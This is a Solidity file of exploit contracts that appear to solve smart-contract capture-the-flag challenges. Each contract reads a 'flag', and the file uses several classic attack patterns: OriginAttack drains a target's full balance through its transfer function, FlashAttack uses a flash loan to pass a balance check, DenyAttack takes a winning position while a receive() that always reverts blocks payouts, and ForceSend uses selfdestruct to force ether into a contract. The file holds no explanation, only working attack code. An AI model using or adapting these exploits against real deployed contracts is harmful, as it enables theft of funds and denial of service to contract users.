// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IOrigin { function transfer(address payable _to, uint _amount) external; function balanceTotal() external view returns(uint); function getFlag() external view returns(string memory); }
contract OriginAttack {
    address public target; address payable public to;
    constructor(address _t, address payable _to) { target=_t; to=_to; }
    function attack() public { IOrigin(target).transfer(to, IOrigin(target).balanceTotal()); }
    function read() public view returns(string memory) { return IOrigin(target).getFlag(); }
}

interface ILP { function flashLoan(address _to, uint256 _amount) external returns(bool); function repayLoan(uint _amount) external; }
interface IRich { function getFlag() external returns(string memory); }
contract FlashAttack {
    address public club; address public token; string public flag;
    constructor(address _c, address _t) { club=_c; token=_t; }
    function start(uint amount) public { ILP(token).flashLoan(address(this), amount); }
    function executeOperation(address, uint256 amount) external {
        flag = IRich(club).getFlag();
        ILP(token).repayLoan(amount);
    }
}

interface IDeny { function makeMeWinner(uint256 _position, address _winner) external payable; function getFlag() external payable returns(string memory); function minimunFee() external view returns(uint256); }
contract DenyAttack {
    string public flag;
    receive() external payable { revert("no gracias"); }
    function go(address deny, uint pos) public payable {
        uint fee = IDeny(deny).minimunFee();
        IDeny(deny).makeMeWinner{value: fee}(pos, address(this));
        flag = IDeny(deny).getFlag{value: fee*5}();
    }
}

contract ForceSend {
    constructor(address payable t) payable { selfdestruct(t); }
}
